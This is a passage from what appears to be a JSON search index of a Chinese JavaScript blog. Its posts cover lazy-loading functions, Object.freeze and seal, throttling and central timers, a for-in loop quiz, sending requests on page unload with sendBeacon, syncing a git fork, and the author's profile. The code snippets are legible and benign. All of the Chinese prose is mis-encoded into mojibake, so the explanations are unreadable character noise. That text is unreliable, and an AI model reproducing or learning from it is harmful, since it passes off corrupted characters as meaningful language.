å‡è®¾æœ‰ä¸€ä¸ªæ–¹æ³•Xï¼Œåœ¨Aç±»æµè§ˆå™¨é‡Œå«A,åœ¨bç±»æµè§ˆå™¨é‡Œå«B,æœ‰äº›æµè§ˆå™¨å¹¶æ²¡æœ‰è¿™ä¸ªæ–¹æ³•,ä½ æƒ³å®ç°ä¸€ä¸ªè·¨æµè§ˆå™¨çš„æ–¹æ³•ã€‚\næƒ°æ€§è½½å…¥å‡½æ•°çš„æ€æƒ³æ˜¯ï¼šåœ¨å‡½æ•°å†…éƒ¨æ”¹å˜å‡½æ•°è‡ªèº«çš„æ‰§è¡Œé€»è¾‘\nfunction X(){ if(A){ return new A(); } else{ if(B){ return new B(); } else{ throw new Error(\u0026#39;no A or B\u0026#39;); } } } æ¢ä¸€ç§å†™æ³•\nfunction X(){ if(A){ X = function(){ return new A(); }; } else{ if(B){ X = function(){ return new B(); }; } else{ throw new Error(\u0026#39;no A or B\u0026#39;); } } return new X(); } 2. é˜²ç¯¡æ”¹å¯¹è±¡ 2.1. ä¸å¯æ‰©å±•å¯¹è±¡ Object.preventExtensions // ä¸‹é¢ä»£ç åœ¨è°·æ­Œæµè§ˆå™¨ä¸­æ‰§è¡Œ \u0026gt; var person = {name: \u0026#39;wdd\u0026#39;}; undefined \u0026gt; Object.preventExtensions(person); Object {name: \u0026#34;wdd\u0026#34;} \u0026gt; person.age = 10 10 \u0026gt; person Object {name: \u0026#34;wdd\u0026#34;} \u0026gt; Object.isExtensible(person) false 2.2. å¯†å°å¯¹è±¡Object.seal å¯†å°å¯¹è±¡ä¸å¯æ‰©å±•ï¼Œå¹¶ä¸”ä¸èƒ½åˆ é™¤å¯¹è±¡çš„å±æ€§æˆ–è€…æ–¹æ³•ã€‚ä½†æ˜¯å±æ€§å€¼å¯ä»¥ä¿®æ”¹ã€‚\n\u0026gt; var one = {name: \u0026#39;hihi\u0026#39;} undefined \u0026gt; Object.seal(one) Object {name: \u0026#34;hihi\u0026#34;} \u0026gt; one.age = 12 12 \u0026gt; one Object {name: \u0026#34;hihi\u0026#34;} \u0026gt; delete one.name false \u0026gt; one Object {name: \u0026#34;hihi\u0026#34;} 2.3. å†»ç»“å¯¹è±¡ Object.freeze æœ€ä¸¥æ ¼çš„é˜²ç¯¡æ”¹å°±æ˜¯å†»ç»“å¯¹è±¡ã€‚å¯¹è±¡ä¸å¯æ‰©å±•ï¼Œè€Œä¸”å¯†å°ï¼Œä¸èƒ½ä¿®æ”¹ã€‚åªèƒ½è®¿é—®ã€‚\n3. é«˜çº§å®šæ—¶å™¨ 3.1. å‡½æ•°èŠ‚æµ å‡½æ•°èŠ‚æµçš„æ€æƒ³æ˜¯ï¼šæŸäº›ä»£ç ä¸å¯ä»¥æ²¡æœ‰é—´æ–­çš„è¿ç»­é‡å¤æ‰§è¡Œ\nvar processor = { timeoutId: null, // å®é™…è¿›è¡Œå¤„ç†çš„æ–¹æ³• performProcessing: function(){ ... }, // åˆå§‹åŒ–è°ƒç”¨æ–¹æ³• process: function(){ clearTimeout(this.timeoutId); var that = this; this.timeoutId = setTimeout(function(){ that.performProcessing(); }, 100); } } // å°è¯•å¼€å§‹æ‰§è¡Œ processor.process(); 3.2. ä¸­å¤®å®šæ—¶å™¨ é¡µé¢å¦‚æœæœ‰åä¸ªåŒºåŸŸè¦åŠ¨æ€æ˜¾ç¤ºå½“å‰æ—¶é—´ï¼Œä¸€èˆ¬æ¥è¯´ï¼Œå¯ä»¥ç”¨10ä¸ªå®šæ—¶æ¥å®ç°ã€‚å…¶å®ä¸€ä¸ªä¸­å¤®å®šæ—¶å™¨å°±å¯ä»¥æå®šã€‚\nä¸­å¤®å®šæ—¶å™¨åŠ¨ç”» demoåœ°å€ï¼šhttp://wangduanduan.coding.me/my-all-demos/ninja/center-time-control.html\nvar timers = { timerId: 0, timers: [], add: function(fn){ this.timers.push(fn); }, start: function(){ if(this.timerId){ return; } (function runNext(){ if(timers.timers.length \u0026gt; 0){ for(var i=0; i \u0026lt; timers.timers.length ; i++){ if(timers.timers[i]() === false){ timers.timers.splice(i, 1); i--; } } timers.timerId = setTimeout(runNext, 16); } })(); }, stop: function(){ clearTimeout(timers.timerId); this.timerId = 0; } }; å‚è€ƒä¹¦ç±ï¼š ã€Šjavascripté«˜çº§ç¨‹åºè®¾è®¡ã€‹ ã€Šjavascriptå¿è€…ç§˜ç±ã€‹\n","permalink":"https://wdd.js.org/posts/2018/02/js-high-skills/","summary":"0.1. å®‰å…¨ç±»å‹æ£€æµ‹ javascriptå†…ç½®ç±»å‹æ£€æµ‹å¹¶ä¸å¯é  safariæŸäº›ç‰ˆæœ¬ï¼ˆ\u0026lt;4ï¼‰typeofæ­£åˆ™è¡¨è¾¾å¼è¿”å›ä¸ºfunction å»ºè®®ä½¿ç”¨Object.prototype.toString.call()æ–¹æ³•æ£€æµ‹æ•°æ®ç±»å‹\nfunction isArray(value){ return Object.prototype.toString.call(value) === \u0026#34;[object Array]\u0026#34;; } function isFunction(value){ return Object.prototype.toString.call(value) === \u0026#34;[object Function]\u0026#34;; } function isRegExp(value){ return Object.prototype.toString.call(value) === \u0026#34;[object RegExp]\u0026#34;; } function isNativeJSON(){ return window.JSON \u0026amp;\u0026amp; Object.prototype.toString.call(JSON) === \u0026#34;[object JSON]\u0026#34;; } å¯¹äºieä¸­ä¸€COMå¯¹è±¡å½¢å¼å®ç°çš„ä»»ä½•å‡½æ•°ï¼ŒisFunctionéƒ½è¿”å›falseï¼Œå› ä¸ºä»–ä»¬å¹¶éåŸç”Ÿçš„javascriptå‡½æ•°ã€‚\nåœ¨webå¼€å‘ä¸­ï¼Œèƒ½å¤ŸåŒºåˆ†åŸç”Ÿä¸éåŸç”Ÿçš„å¯¹è±¡éå¸¸é‡è¦ã€‚åªæœ‰è¿™æ ·æ‰èƒ½ç¡®åˆ‡çŸ¥é“æŸä¸ªå¯¹è±¡æ˜¯å¦æœ‰å“ªäº›åŠŸèƒ½\nä»¥ä¸Šæ‰€æœ‰çš„æ­£ç¡®æ€§çš„å‰ææ˜¯ï¼šObject.prototype.toStringæ²¡æœ‰è¢«ä¿®æ”¹è¿‡\n0.2. ä½œç”¨åŸŸå®‰å…¨çš„æ„é€ å‡½æ•° function Person(name){ this.name = name; } //ä½¿ç”¨newæ¥åˆ›å»ºä¸€ä¸ªå¯¹è±¡ var one = new Person(\u0026#39;wdd\u0026#39;); //ç›´æ¥è°ƒç”¨æ„é€ å‡½æ•° Person(); ç”±äºthisæ˜¯è¿è¡Œæ—¶åˆ†é…çš„ï¼Œå¦‚æœä½ ä½¿ç”¨newæ¥æ“ä½œï¼ŒthisæŒ‡å‘çš„å°±æ˜¯oneã€‚å¦‚æœç›´æ¥è°ƒç”¨æ„é€ å‡½æ•°ï¼Œé‚£ä¹ˆthisä¼šæŒ‡å‘å…¨å±€å¯¹è±¡window,ç„¶åä½ çš„ä»£ç å°±ä¼šè¦†ç›–windowçš„åŸç”Ÿnameã€‚å¦‚æœæœ‰å…¶ä»–åœ°æ–¹ä½¿ç”¨è¿‡window.name, é‚£ä¹ˆä½ çš„å‡½æ•°å°†ä¼šåŸ‹ä¸‹ä¸€ä¸ªæ·±è—çš„bugã€‚\n==é‚£ä¹ˆï¼Œå¦‚ä½•æ‰èƒ½åˆ›å»ºä¸€ä¸ªä½œç”¨åŸŸå®‰å…¨çš„æ„é€ å‡½æ•°ï¼Ÿ== æ–¹æ³•1\nfunction Person(name){ if(this instanceof Person){ this.name = name; } else{ return new Person(name); } } 1.","title":"JavaScript é«˜çº§æŠ€å·§"},{"content":"0.1. å…ˆçœ‹é¢˜ï¼šmeançš„å€¼æ˜¯ä»€ä¹ˆï¼Ÿ var scores = [10,11,12]; var total = 0; for(var score in scores){ total += score; } var mean = total/scores.length; console.log(mean); 0.2. æ˜¯11ï¼Ÿ æ­å–œä½ ï¼šç­”é”™äº†ï¼\n0.3. æ˜¯1ï¼Ÿ æ­å–œä½ ï¼šç­”é”™äº†ï¼\n0.4. æ­£ç¡®ç­”æ¡ˆï¼š 4 è§£é‡Šï¼š for in å¾ªç¯å¾ªç¯çš„å€¼æ°¸è¿œæ˜¯key, keyæ˜¯ä¸€ä¸ªå­—ç¬¦ä¸²ã€‚æ‰€ä»¥totalçš„å€¼æ˜¯ï¼š\u0026lsquo;0012\u0026rsquo;ã€‚å®ƒæ˜¯ä¸€ä¸ªå­—ç¬¦ä¸²ï¼Œå­—ç¬¦ä¸²'0012\u0026rsquo;/3,0012ä¼šè¢«è½¬æ¢æˆ12ï¼Œç„¶åé™¤ä»¥3ï¼Œç»“æœæ˜¯4ã€‚\n0.5. åè®° è¿™ä¸ªç¤ºä¾‹æ˜¯æ¥è‡ªã€Šç¼–å†™é«˜è´¨é‡JavaScriptçš„68ä¸ªæ–¹æ³•ã€‹çš„ç¬¬49æ¡ï¼šæ•°ç»„è¿­ä»£è¦ä¼˜å…ˆä½¿ç”¨forå¾ªç¯è€Œä¸æ˜¯for inå¾ªç¯ã€‚ æ—¢ç„¶å·²ç»å‘å¸ƒï¼Œå°±å¯èƒ½æœ‰å¥½äº‹è€…æ‹¿å‡ºå»å½“é¢è¯•é¢˜ã€‚è¿™ä¸ªé¢˜ç›®å¾ˆæœ‰å¯èƒ½å‘ä¸€å †äººã€‚å…¶ä¸­åŒ…æ‹¬æˆ‘ã€‚\nè¿™é‡Œæ¶‰åŠåˆ°è®¸å¤šjsçš„åŸºç¡€çŸ¥è¯†.\nfor in å¾ªç¯æ˜¯å¾ªç¯å¯¹è±¡çš„ç´¢å¼•å±æ€§ï¼Œkeyæ˜¯ä¸€ä¸ªå­—ç¬¦ä¸²ã€‚ æ•°å€¼ç±»å‹å’Œå­—ç¬¦ä¸²ç›¸åŠ ï¼Œä¼šè‡ªåŠ¨è½¬æ¢ä¸ºå­—ç¬¦ä¸² å­—ç¬¦ä¸²é™¤ä»¥æ•°å€¼ç±»å‹ï¼Œä¼šå…ˆæŠŠå­—ç¬¦ä¸²è½¬ä¸ºæ•°å€¼ï¼Œæœ€ç»ˆç»“æœä¸ºæ•°å€¼ æ­£ç¡®æ–¹æ³•\nvar scores = [10,11,12]; var total = 0; for(var i=0, n=scores.length; i \u0026lt; n; i++){ total += scores[i]; } var mean = total/scores.length; console.log(mean); è¿™æ ·å†™æœ‰å‡ ä¸ªå¥½å¤„ã€‚\nå¾ªç¯çš„ç»ˆæ­¢æ¡ä»¶ç®€å•ä¸”æ˜ç¡® å³ä½¿åœ¨å¾ªç¯ä½“å†…ä¿®æ”¹äº†æ•°ç»„ï¼Œä¹Ÿèƒ½æœ‰æ•ˆçš„ç»ˆæ­¢å¾ªç¯ã€‚å¦åˆ™å°±å¯èƒ½å˜æˆæ­»å¾ªç¯ã€‚ ç¼–è¯‘å™¨å¾ˆéš¾ä¿è¯é‡å¯è®¡ç®—scores.lengthæ˜¯å®‰å…¨çš„ã€‚ æå‰ç¡®å®šäº†å¾ªç¯ç»ˆæ­¢æ¡ä»¶ï¼Œé¿å…å¤šæ¬¡è®¡ç®—æ•°ç»„é•¿åº¦ã€‚è¿™ä¸ªå¯èƒ½ä¼šè¢«ä¸€äº›æµè§ˆå™¨ä¼˜åŒ–ã€‚ ","permalink":"https://wdd.js.org/posts/2018/02/i-realy-dont-know-js/","summary":"0.1. å…ˆçœ‹é¢˜ï¼šmeançš„å€¼æ˜¯ä»€ä¹ˆï¼Ÿ var scores = [10,11,12]; var total = 0; for(var score in scores){ total += score; } var mean = total/scores.length; console.log(mean); 0.2. æ˜¯11ï¼Ÿ æ­å–œä½ ï¼šç­”é”™äº†ï¼\n0.3. æ˜¯1ï¼Ÿ æ­å–œä½ ï¼šç­”é”™äº†ï¼\n0.4. æ­£ç¡®ç­”æ¡ˆï¼š 4 è§£é‡Šï¼š for in å¾ªç¯å¾ªç¯çš„å€¼æ°¸è¿œæ˜¯key, keyæ˜¯ä¸€ä¸ªå­—ç¬¦ä¸²ã€‚æ‰€ä»¥totalçš„å€¼æ˜¯ï¼š\u0026lsquo;0012\u0026rsquo;ã€‚å®ƒæ˜¯ä¸€ä¸ªå­—ç¬¦ä¸²ï¼Œå­—ç¬¦ä¸²'0012\u0026rsquo;/3,0012ä¼šè¢«è½¬æ¢æˆ12ï¼Œç„¶åé™¤ä»¥3ï¼Œç»“æœæ˜¯4ã€‚\n0.5. åè®° è¿™ä¸ªç¤ºä¾‹æ˜¯æ¥è‡ªã€Šç¼–å†™é«˜è´¨é‡JavaScriptçš„68ä¸ªæ–¹æ³•ã€‹çš„ç¬¬49æ¡ï¼šæ•°ç»„è¿­ä»£è¦ä¼˜å…ˆä½¿ç”¨forå¾ªç¯è€Œä¸æ˜¯for inå¾ªç¯ã€‚ æ—¢ç„¶å·²ç»å‘å¸ƒï¼Œå°±å¯èƒ½æœ‰å¥½äº‹è€…æ‹¿å‡ºå»å½“é¢è¯•é¢˜ã€‚è¿™ä¸ªé¢˜ç›®å¾ˆæœ‰å¯èƒ½å‘ä¸€å †äººã€‚å…¶ä¸­åŒ…æ‹¬æˆ‘ã€‚\nè¿™é‡Œæ¶‰åŠåˆ°è®¸å¤šjsçš„åŸºç¡€çŸ¥è¯†.\nfor in å¾ªç¯æ˜¯å¾ªç¯å¯¹è±¡çš„ç´¢å¼•å±æ€§ï¼Œkeyæ˜¯ä¸€ä¸ªå­—ç¬¦ä¸²ã€‚ æ•°å€¼ç±»å‹å’Œå­—ç¬¦ä¸²ç›¸åŠ ï¼Œä¼šè‡ªåŠ¨è½¬æ¢ä¸ºå­—ç¬¦ä¸² å­—ç¬¦ä¸²é™¤ä»¥æ•°å€¼ç±»å‹ï¼Œä¼šå…ˆæŠŠå­—ç¬¦ä¸²è½¬ä¸ºæ•°å€¼ï¼Œæœ€ç»ˆç»“æœä¸ºæ•°å€¼ æ­£ç¡®æ–¹æ³•\nvar scores = [10,11,12]; var total = 0; for(var i=0, n=scores.length; i \u0026lt; n; i++){ total += scores[i]; } var mean = total/scores.","title":"çªç„¶è§‰å¾—è‡ªå·±å¥½åƒæ²¡å­¦è¿‡JS"},{"content":"0.1. åŒæ­¥Ajax è¿™ç§éœ€æ±‚ä¸»è¦ç”¨äºå½“æµè§ˆå™¨å…³é—­ï¼Œæˆ–è€…åˆ·æ–°æ—¶ï¼Œå‘åç«¯å‘èµ·Ajaxè¯·æ±‚ã€‚\nwindow.onunload = function(){ $.ajax({url:\u0026#34;http://localhost:8888/test.php?\u0026#34;, async:false}); }; ä½¿ç”¨asyncï¼šfalseå‚æ•°ä½¿è¯·æ±‚åŒæ­¥ï¼ˆé»˜è®¤æ˜¯å¼‚æ­¥çš„ï¼‰ã€‚\nåŒæ­¥è¯·æ±‚é”å®šæµè§ˆå™¨ï¼Œç›´åˆ°å®Œæˆã€‚ å¦‚æœè¯·æ±‚æ˜¯å¼‚æ­¥çš„ï¼Œé¡µé¢åªæ˜¯ç»§ç»­å¸è½½ã€‚ å®ƒè¶³å¤Ÿå¿«ï¼Œä»¥è‡³äºè¯¥è¯·æ±‚ç”šè‡³æ²¡æœ‰æ—¶é—´è§¦å‘ã€‚æœåŠ¡ç«¯å¾ˆå¯èƒ½æ”¶ä¸åˆ°è¯·æ±‚ã€‚\n0.2. navigator.sendBeacon ä¼˜ç‚¹ï¼šç®€æ´ã€å¼‚æ­¥ã€éé˜»å¡ ç¼ºç‚¹ï¼šè¿™æ˜¯å®éªŒæ€§çš„æŠ€æœ¯ï¼Œå¹¶éæ‰€æœ‰æµè§ˆå™¨éƒ½æ”¯æŒã€‚å…¶ä¸­IEå’Œsafariä¸æ”¯æŒè¯¥æŠ€æœ¯ã€‚\nç¤ºä¾‹ï¼š\nwindow.addEventListener(\u0026#39;unload\u0026#39;, logData, false); function logData() { navigator.sendBeacon(\u0026#34;/log\u0026#34;, analyticsData); } å‚è€ƒï¼šhttp://stackoverflow.com/questions/1821625/ajax-request-with-jquery-on-page-unload å‚è€ƒï¼šhttps://developer.mozilla.org/en-US/docs/Web/API/Navigator/sendBeacon\n","permalink":"https://wdd.js.org/posts/2018/02/send-ajax-when-page-unload/","summary":"0.1. åŒæ­¥Ajax è¿™ç§éœ€æ±‚ä¸»è¦ç”¨äºå½“æµè§ˆå™¨å…³é—­ï¼Œæˆ–è€…åˆ·æ–°æ—¶ï¼Œå‘åç«¯å‘èµ·Ajaxè¯·æ±‚ã€‚\nwindow.onunload = function(){ $.ajax({url:\u0026#34;http://localhost:8888/test.php?\u0026#34;, async:false}); }; ä½¿ç”¨asyncï¼šfalseå‚æ•°ä½¿è¯·æ±‚åŒæ­¥ï¼ˆé»˜è®¤æ˜¯å¼‚æ­¥çš„ï¼‰ã€‚\nåŒæ­¥è¯·æ±‚é”å®šæµè§ˆå™¨ï¼Œç›´åˆ°å®Œæˆã€‚ å¦‚æœè¯·æ±‚æ˜¯å¼‚æ­¥çš„ï¼Œé¡µé¢åªæ˜¯ç»§ç»­å¸è½½ã€‚ å®ƒè¶³å¤Ÿå¿«ï¼Œä»¥è‡³äºè¯¥è¯·æ±‚ç”šè‡³æ²¡æœ‰æ—¶é—´è§¦å‘ã€‚æœåŠ¡ç«¯å¾ˆå¯èƒ½æ”¶ä¸åˆ°è¯·æ±‚ã€‚\n0.2. navigator.sendBeacon ä¼˜ç‚¹ï¼šç®€æ´ã€å¼‚æ­¥ã€éé˜»å¡ ç¼ºç‚¹ï¼šè¿™æ˜¯å®éªŒæ€§çš„æŠ€æœ¯ï¼Œå¹¶éæ‰€æœ‰æµè§ˆå™¨éƒ½æ”¯æŒã€‚å…¶ä¸­IEå’Œsafariä¸æ”¯æŒè¯¥æŠ€æœ¯ã€‚\nç¤ºä¾‹ï¼š\nwindow.addEventListener(\u0026#39;unload\u0026#39;, logData, false); function logData() { navigator.sendBeacon(\u0026#34;/log\u0026#34;, analyticsData); } å‚è€ƒï¼šhttp://stackoverflow.com/questions/1821625/ajax-request-with-jquery-on-page-unload å‚è€ƒï¼šhttps://developer.mozilla.org/en-US/docs/Web/API/Navigator/sendBeacon","title":"å‘èµ·Ajaxè¯·æ±‚å½“é¡µé¢onunload"},{"content":"1. å‰æè¯´æ˜ ä»“åº“A: http://gitlab.tt.cc:30000/fe/omp.git ä»“åº“B: ä»“åº“Bforkè‡ªä»“åº“A, ä»“åº“Açš„åœ°å€æ˜¯ï¼šhttp://gitlab.tt.cc:30000/wangdd/omp.git æŸä¸€æ—¶åˆ»ï¼Œä»“åº“Aæ›´æ–°äº†ã€‚ä»“åº“Béœ€è¦åŒæ­¥ä¸Šæ¸¸åˆ†æ”¯çš„æ›´æ–°ã€‚\n2. æœ¬åœ°æ“ä½œ // 1 æŸ¥çœ‹è¿œç¨‹åˆ†æ”¯ âœ omp git:(master) git remote -v origin\thttp://gitlab.tt.cc:30000/wangdd/omp.git (fetch) origin\thttp://gitlab.tt.cc:30000/wangdd/omp.git (push) // 2 æ·»åŠ ä¸€ä¸ªè¿œç¨‹åŒæ­¥çš„ä¸Šæ¸¸ä»“åº“ âœ omp git:(master) git remote add upstream http://gitlab.tt.cc:30000/fe/omp.git âœ omp git:(master) git remote -v origin\thttp://gitlab.tt.cc:30000/wangdd/omp.git (fetch) origin\thttp://gitlab.tt.cc:30000/wangdd/omp.git (push) upstream\thttp://gitlab.tt.cc:30000/fe/omp.git (fetch) upstream\thttp://gitlab.tt.cc:30000/fe/omp.git (push) // 3 æ‹‰å»ä¸Šæ¸¸åˆ†æ”¯åˆ°æœ¬åœ°ï¼Œå¹¶ä¸”ä¼šè¢«å­˜å‚¨åœ¨ä¸€ä¸ªæ–°åˆ†æ”¯upstream/master âœ omp git:(master) git fetch upstream remote: Counting objects: 4, done. remote: Compressing objects: 100% (4/4), done. remote: Total 4 (delta 2), reused 0 (delta 0) Unpacking objects: 100% (4/4), done. From http://gitlab.tt.cc:30000/fe/omp * [new branch] master -\u0026gt; upstream/master // 4 å°†upstream/masteråˆ†æ”¯åˆå¹¶åˆ°masteråˆ†æ”¯ï¼Œç”±äºæˆ‘å·²ç»åœ¨masteråˆ†æ”¯ï¼Œæ­¤å¤„å°±ä¸åœ¨åˆ‡æ¢åˆ°masteråˆ†æ”¯ âœ omp git:(master) git merge upstream/master Updating 29c098c..6413803 Fast-forward README.md | 1 + 1 file changed, 1 insertion(+) // 5 æŸ¥çœ‹ä¸€ä¸‹ï¼Œæ­¤æ¬¡åˆå¹¶ï¼Œæœ¬åœ°æœ‰å“ªäº›æ›´æ–° âœ omp git:(master) git log -p // 6 ç„¶åå°†æ›´æ–°æ¨é€åˆ°ä»“åº“B âœ omp git:(master) git push 3. æ€»ç»“ é€šè¿‡ä¸Šè¿°æ“ä½œï¼Œä»“åº“Bå°±åŒæ­¥äº†ä»“åº“Açš„ä»£ç ã€‚æ•´ä½“çš„é€»è¾‘å°±æ˜¯å°†ä¸Šæ¸¸åˆ†æ”¯æ‹‰å»åˆ°æœ¬åœ°ï¼Œç„¶ååˆå¹¶åˆ°æœ¬åœ°åˆ†æ”¯ä¸Šã€‚å°±è¿™ä¹ˆç®€å•ã€‚\n","permalink":"https://wdd.js.org/posts/2018/01/fork-sync-learn/","summary":"1. å‰æè¯´æ˜ ä»“åº“A: http://gitlab.tt.cc:30000/fe/omp.git ä»“åº“B: ä»“åº“Bforkè‡ªä»“åº“A, ä»“åº“Açš„åœ°å€æ˜¯ï¼šhttp://gitlab.tt.cc:30000/wangdd/omp.git æŸä¸€æ—¶åˆ»ï¼Œä»“åº“Aæ›´æ–°äº†ã€‚ä»“åº“Béœ€è¦åŒæ­¥ä¸Šæ¸¸åˆ†æ”¯çš„æ›´æ–°ã€‚\n2. æœ¬åœ°æ“ä½œ // 1 æŸ¥çœ‹è¿œç¨‹åˆ†æ”¯ âœ omp git:(master) git remote -v origin\thttp://gitlab.tt.cc:30000/wangdd/omp.git (fetch) origin\thttp://gitlab.tt.cc:30000/wangdd/omp.git (push) // 2 æ·»åŠ ä¸€ä¸ªè¿œç¨‹åŒæ­¥çš„ä¸Šæ¸¸ä»“åº“ âœ omp git:(master) git remote add upstream http://gitlab.tt.cc:30000/fe/omp.git âœ omp git:(master) git remote -v origin\thttp://gitlab.tt.cc:30000/wangdd/omp.git (fetch) origin\thttp://gitlab.tt.cc:30000/wangdd/omp.git (push) upstream\thttp://gitlab.tt.cc:30000/fe/omp.git (fetch) upstream\thttp://gitlab.tt.cc:30000/fe/omp.git (push) // 3 æ‹‰å»ä¸Šæ¸¸åˆ†æ”¯åˆ°æœ¬åœ°ï¼Œå¹¶ä¸”ä¼šè¢«å­˜å‚¨åœ¨ä¸€ä¸ªæ–°åˆ†æ”¯upstream/master âœ omp git:(master) git fetch upstream remote: Counting objects: 4, done. remote: Compressing objects: 100% (4/4), done.","title":"gitåˆå¹¶ä¸Šæ¸¸ä»“åº“å³åŒæ­¥forkåçš„ä»“åº“"},{"content":" ä¸ªäººç®€ä»‹ æˆ‘æ˜¯Eddie Wangï¼\nç²¾é€šJavaScript/Node.jsï¼Œç°åœ¨çš„å…´è¶£æ˜¯å­¦ä¹ goè¯­è¨€ ç²¾é€šVOIPç›¸å…³æŠ€æœ¯æ ˆï¼šSIP/opensips/Freeswitchç­‰ç­‰ ç²¾é€šVIM email: eddie0501@qq.com Github: github.com/wangduanduan è¯­é›€: yuque.com/wangdd, å°†ä¸ä¼šæ›´æ–° ä¸ªäººåšå®¢: wdd.js.org, æœ€æ–°å†…å®¹å°†ä¼šå‘å¸ƒåœ¨wdd.js.org æœ€å–œæ¬¢çš„ç¾å‰§ã€Šé»„çŸ³ã€‹ å–œæ¬¢è¯»ä¹¦ã€ç¾å‰§ã€åšé¥­ å¾®ä¿¡é˜…è¯»èµ„æ·±ä¼šå‘˜ åšå®¢è¯´æ˜ åšå®¢å–åä¸ºæ´é¦™æ˜¥ï¼Œçµæ„Ÿæ¥è‡ªå­™çš“æ™–æ‰€è‘—ã€Šå¤§ç§¦å¸å›½ã€‹ã€‚\næ´é¦™æ˜¥å¤§è‡´åœ¨æˆ˜å›½æ—¶ä»£ä¸­æœŸæ‰€åœ¨åœ°ï¼šé­å›½å®‰é‚‘ã€‚\næˆ˜å›½æ—¶æœŸï¼Œç¤¾ä¼šåˆ¶åº¦å‘ç”Ÿç€å·¨å¤§å˜åŒ–ï¼Œå·¥å•†ä¸šæ—¥ç›Šå…´æ—ºï¼Œå‡ºç°äº†ä»¥ç™½åœ­ä¸ºé¦–çš„ä¸€æ‰¹å·¨è´¾å•†äººï¼Œè€Œä½äºé­å›½å®‰é‚‘çš„æ´é¦™æ˜¥é…’è‚†å°±æ˜¯ç™½æ°å®¶æ—åˆ›åŠçš„äº§ä¸šä¸­æœ€ä¸ºè‘—åçš„ä¸€ä¸ªã€‚\næ´é¦™æ˜¥ä»¥åå£«èŸèƒã€è°ˆè®ºå›½äº‹ã€äº¤æµæ€æƒ³è€Œè‘—ç§°äºå½“æ—¶åˆ—å›½\n","permalink":"https://wdd.js.org/about/","summary":"ä¸ªäººç®€ä»‹ æˆ‘æ˜¯Eddie Wangï¼\nç²¾é€šJavaScript/Node.jsï¼Œç°åœ¨çš„å…´è¶£æ˜¯å­¦ä¹ goè¯­è¨€ ç²¾é€šVOIPç›¸å…³æŠ€æœ¯æ ˆï¼šSIP/opensips/Freeswitchç­‰ç­‰ ç²¾é€šVIM email: eddie0501@qq.com Github: github.com/wangduanduan è¯­é›€: yuque.com/wangdd, å°†ä¸ä¼šæ›´æ–° ä¸ªäººåšå®¢: wdd.js.org, æœ€æ–°å†…å®¹å°†ä¼šå‘å¸ƒåœ¨wdd.js.org æœ€å–œæ¬¢çš„ç¾å‰§ã€Šé»„çŸ³ã€‹ å–œæ¬¢è¯»ä¹¦ã€ç¾å‰§ã€åšé¥­ å¾®ä¿¡é˜…è¯»èµ„æ·±ä¼šå‘˜ åšå®¢è¯´æ˜ åšå®¢å–åä¸ºæ´é¦™æ˜¥ï¼Œçµæ„Ÿæ¥è‡ªå­™çš“æ™–æ‰€è‘—ã€Šå¤§ç§¦å¸å›½ã€‹ã€‚\næ´é¦™æ˜¥å¤§è‡´åœ¨æˆ˜å›½æ—¶ä»£ä¸­æœŸæ‰€åœ¨åœ°ï¼šé­å›½å®‰é‚‘ã€‚\næˆ˜å›½æ—¶æœŸï¼Œç¤¾ä¼šåˆ¶åº¦å‘ç”Ÿç€å·¨å¤§å˜åŒ–ï¼Œå·¥å•†ä¸šæ—¥ç›Šå…´æ—ºï¼Œå‡ºç°äº†ä»¥ç™½åœ­ä¸ºé¦–çš„ä¸€æ‰¹å·¨è´¾å•†äººï¼Œè€Œä½äºé­å›½å®‰é‚‘çš„æ´é¦™æ˜¥é…’è‚†å°±æ˜¯ç™½æ°å®¶æ—åˆ›åŠçš„äº§ä¸šä¸­æœ€ä¸ºè‘—åçš„ä¸€ä¸ªã€‚\næ´é¦™æ˜¥ä»¥åå£«èŸèƒã€è°ˆè®ºå›½äº‹ã€äº¤æµæ€æƒ³è€Œè‘—ç§°äºå½“æ—¶åˆ—å›½","title":"å…³äºæˆ‘"},{"content":" 1. HTTPæºå¸¦ä¿¡æ¯çš„æ–¹å¼ url headers body: åŒ…æ‹¬è¯·æ±‚ä½“ï¼Œå“åº”ä½“ 2. åˆ†ç¦»é€šç”¨ä¿¡æ¯ ä¸€èˆ¬æ¥è¯´ï¼Œheadersé‡Œçš„ä¿¡æ¯éƒ½æ˜¯é€šç”¨çš„ï¼Œå¯ä»¥æå‰è¯´æ˜ï¼Œä½œä¸ºé»˜è®¤å‚æ•°\n3. è·¯å¾„ä¸­çš„å‚æ•°è¡¨è¾¾å¼ URLä¸­å‚æ•°è¡¨è¾¾å¼ä½¿ç”¨{}çš„å½¢å¼ï¼Œå‚æ•°åŒ…è£¹åœ¨å¤§æ‹¬å·ä¹‹ä¸­{paramName}\nä¾‹å¦‚ï¼š\n/api/user/{userId} /api/user/{userType}?age={age}\u0026amp;gender={gender} 4. æ•°æ®æ¨¡å‹å®šä¹‰ æ•°æ®æ¨¡å‹å®šä¹‰åŒ…æ‹¬ï¼š\nè·¯å¾„ä¸æŸ¥è¯¢å­—ç¬¦ä¸²å‚æ•°æ¨¡å‹ è¯·æ±‚ä½“å‚æ•°æ¨¡å‹ å“åº”ä½“å‚æ•°æ¨¡å‹ æ•°æ®æ¨¡å‹çš„æœ€å°æ•°æ®é›†ï¼š\nåç§° æ˜¯å¦å¿…é¡» è¯´æ˜ â€œæœ€å°æ•°æ®é›†â€ï¼ˆMDSï¼‰æ˜¯æŒ‡é€šè¿‡æ”¶é›†æœ€å°‘çš„æ•°æ®ï¼Œè¾ƒå¥½åœ°æŒæ¡ä¸€ä¸ªç ”ç©¶å¯¹è±¡æ‰€å…·æœ‰çš„ç‰¹ç‚¹æˆ–ä¸€ä»¶äº‹æƒ…ã€ä¸€ä»½å·¥ä½œæ‰€å¤„çš„çŠ¶æ€ï¼Œå…¶æ ¸å¿ƒæ˜¯é’ˆå¯¹è¢«è§‚å¯Ÿçš„å¯¹è±¡å»ºç«‹èµ·ä¸€å¥—ç²¾ç®€å®ç”¨çš„æ•°æ®æŒ‡æ 